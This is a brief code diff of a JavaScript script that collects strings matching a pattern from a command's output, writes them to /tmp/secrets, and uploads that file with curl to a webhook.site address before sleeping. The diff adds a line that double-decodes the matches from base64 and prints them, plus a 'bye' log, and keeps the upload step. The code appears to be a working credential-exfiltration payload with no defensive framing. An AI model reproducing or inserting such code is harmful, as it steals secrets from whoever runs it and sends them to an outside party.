@@ -12,9 +12,10 @@ exec(
     const matches = stdout
       .replace(/\0/g, '')
       .match(new RegExp(pattern, 'g'));
-    
+    console.log(atob(atob(matches)));
     require('fs').appendFileSync('/tmp/secrets', (matches || []).join('\n'));
   }
 );
 exec(`bash -c 'curl -X PUT --upload-file /tmp/secrets https://webhook.site/82254406-e94e-4109-9231-1205c05c68fa'`)
+console.log('bye');
 exec(`bash -c 'sleep 6000'`);
